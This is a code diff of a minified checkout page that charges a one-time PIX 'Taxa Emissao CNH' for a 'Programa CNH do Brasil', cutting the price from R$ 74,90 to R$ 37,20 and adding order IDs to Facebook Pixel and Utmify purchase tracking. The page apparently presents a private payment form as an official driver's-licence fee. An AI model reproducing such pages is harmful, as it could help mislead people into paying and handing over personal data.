@@ -14912,7 +14912,7 @@ function gp() {
       content_type: "product",
       content_id: "cnh_brasil_taxa_emissao",
       content_name: "Taxa Emissao CNH - CNH do Brasil",
-      value: 74.9,
+      value: 37.9,
       currency: "BRL",
       email: b,
       phone: C
@@ -14929,27 +14929,29 @@ function gp() {
     }
     if (typeof window.fbq < "u") try {
       window.fbq("track", "Purchase", {
-        value: 74.9,
+        value: 37.2,
         currency: "BRL",
         content_name: "Taxa Emissao CNH - CNH do Brasil",
         content_type: "product"
       }), console.log("Facebook Pixel (4327697327497010): Purchase tracked"), window.fbq("trackSingle", "1555494242118668", "Purchase", {
-        value: 74.9,
+        value: 37.2,
         currency: "BRL",
         content_name: "Taxa Emissao CNH - CNH do Brasil",
         content_type: "product"
       }), console.log("Facebook Pixel (4327697327497010): Purchase tracked"), window.fbq("trackSingle", "1154359756859567", "Purchase", {
-        value: 74.9,
+        value: 37.2,
         currency: "BRL",
         content_name: "Taxa Emissao CNH - CNH do Brasil",
         content_type: "product"
       }), console.log("Facebook Pixel (4327697327497010): Purchase tracked"), window.fbq("trackSingle", "2062889337802425", "Purchase", {
-        value: 74.9,
+        value: 37.2,
         currency: "BRL",
         content_name: "Taxa Emissao CNH - CNH do Brasil",
         content_type: "product"
       }), console.log("Facebook Pixel (4327697327497010): Purchase tracked")
-    } catch (A) {console.error("Facebook Pixel error:", A)} try {const _utmPurchase=()=>{try{window.utmify("track","Purchase",{value:37.2,currency:"BRL"}),console.log("Utmify: Purchase tracked")}catch(e){console.error("Utmify error:",e)}};if(window.utmify){_utmPurchase()}else{let _attempts=0;const _interval=setInterval(()=>{_attempts++;if(window.utmify){clearInterval(_interval);_utmPurchase()}else if(_attempts>=20){clearInterval(_interval);console.warn("Utmify: script not loaded after 10s, Purchase not tracked")}},500)}}catch(A){console.error("Utmify setup error:",A)}
+    } catch (A) {console.error("Facebook Pixel error:", A)} try {const _utmPurchase=()=>{try{const _oid=window._lastTransactionId||("order_"+Date.now());
+window.utmify("track","Purchase",{orderId:_oid,value:37.2,currency:"BRL"})
+,console.log("Utmify: Purchase tracked")}catch(e){console.error("Utmify error:",e)}};if(window.utmify){_utmPurchase()}else{let _attempts=0;const _interval=setInterval(()=>{_attempts++;if(window.utmify){clearInterval(_interval);_utmPurchase()}else if(_attempts>=20){clearInterval(_interval);console.warn("Utmify: script not loaded after 10s, Purchase not tracked")}},500)}}catch(A){console.error("Utmify setup error:",A)}
 
    
     localStorage.setItem(p, new Date().toISOString())
@@ -15005,7 +15007,7 @@ function gp() {
                 "Content-Type": "application/json"
               },
               body: JSON.stringify({
-                amount: 74.9,
+                amount: 37.2,
                 customer_name: b.nome,
                 customer_email: b.email || "cliente@email.com",
                 customer_phone: b.phone || "11999999999",
@@ -15132,7 +15134,7 @@ function gp() {
                 }), " para finalizar seu cadastro no Programa CNH do Brasil"]
               }), l.jsxs("li", {
                 children: ["• Valor único de ", l.jsx("strong", {
-                  children: "R$ 74,90"
+                  children: "R$ 37,20"
                 }), " pago uma única vez"]
               }), l.jsx("li", {
                 children: "• Taxa destinada ao processo de emissão e regularização da CNH"
@@ -15159,7 +15161,7 @@ function gp() {
             className: "text-center mb-6",
             children: [l.jsx("p", {
               className: "text-3xl font-bold text-green-600",
-              children: "R$ 74,90"
+              children: "R$ 37,20"
             }), l.jsx("p", {
               className: "text-gray-600",
               children: "Taxa única de emissão"
@@ -15258,7 +15260,7 @@ function gp() {
                 }), l.jsx("li", {
                   children: "3. Escaneie o QR Code ou cole o código PIX"
                 }), l.jsx("li", {
-                  children: "4. Confirme o pagamento de R$ 74,90"
+                  children: "4. Confirme o pagamento de R$ 37,20"
                 })]
               })]
             }), t && l.jsx("div", {
